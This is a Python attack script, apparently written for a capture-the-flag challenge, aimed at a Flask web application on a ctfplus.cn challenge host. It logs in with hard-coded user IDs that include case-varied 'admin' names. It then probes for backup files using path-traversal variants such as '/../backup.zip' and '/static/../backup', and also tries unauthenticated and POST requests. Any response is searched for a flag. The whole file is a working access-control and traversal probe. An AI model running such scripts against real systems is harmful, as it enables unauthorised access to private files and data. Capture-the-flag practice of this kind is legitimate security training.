import requests
import re

BASE_URL = "http://8080-f38af472-f3ae-405c-9d07-9ac048a61efd.challenge.ctfplus.cn"
session = requests.Session()

print("[*] Flask 备份接口漏洞 - 直接访问尝试")
print(f"[*] Target: {BASE_URL}")
print()

# 测试1: 登录后直接访问备份文件
print("[*] 测试1: 登录后直接访问备份文件")

uid = "3553c1effa0b4698895a4874cfbd86d8"
session.post(f"{BASE_URL}/login", data={"uid": uid})

backup_files = [
    "/backup.zip",
    "/backup.txt",
    "/backup",
    "/static/backup.zip",
    "/static/backup.txt",
    "/static/backup",
    "/../backup.zip",
    "/../backup.txt",
    "/../backup",
    "/static/../backup.zip",
    "/static/../backup.txt",
    "/static/../backup",
]

for path in backup_files:
    resp = session.get(f"{BASE_URL}{path}")
    if resp.status_code != 404:
        print(f"    [+] {path}: {resp.status_code}")
        print(f"    {resp.text[:500]}")
        
        if "flag" in resp.text.lower():
            print(f"    [!!!] 发现 flag!")
            flag_match = re.search(r'flag\{[^}]+\}', resp.text, re.IGNORECASE)
            if flag_match:
                print(f"    [!!!] Flag: {flag_match.group()}")

print()

# 测试2: 尝试不同用户的 UID 访问备份
print("[*] 测试2: 用不同 UID 访问备份")

test_uids = [
    ("3553c1effa0b4698895a4874cfbd86d8", "ADMiN"),
    ("eb0ffb79891641d789c50970f64aa263", "aDMin"),
    ("8821f97fff4f407d906b14f3ac855b2d", "testuser"),
]

for uid, name in test_uids:
    print(f"    [-] {name}: {uid}")
    
    # 登录
    session.post(f"{BASE_URL}/login", data={"uid": uid})
    
    # 访问备份
    for path in ["/backup", "/backup.zip", "/backup.txt"]:
        resp = session.get(f"{BASE_URL}{path}")
        if resp.status_code != 404:
            print(f"        [+] {path}: {resp.status_code}")
            print(f"        {resp.text[:300]}")

print()

# 测试3: 不登录直接访问备份
print("[*] 测试3: 不登录直接访问备份")

for path in ["/backup", "/backup.zip", "/backup.txt"]:
    resp = session.get(f"{BASE_URL}{path}")
    if resp.status_code != 404:
        print(f"    [+] {path}: {resp.status_code}")
        print(f"    {resp.text[:300]}")

print()

# 测试4: POST 方法访问备份
print("[*] 测试4: POST 方法访问备份")

for path in ["/backup", "/backup.zip", "/backup.txt"]:
    resp = session.post(f"{BASE_URL}{path}")
    if resp.status_code != 404 and resp.status_code != 405:
        print(f"    [+] {path}: {resp.status_code}")
        print(f"    {resp.text[:300]}")

print()

print("[*] 测试完成")
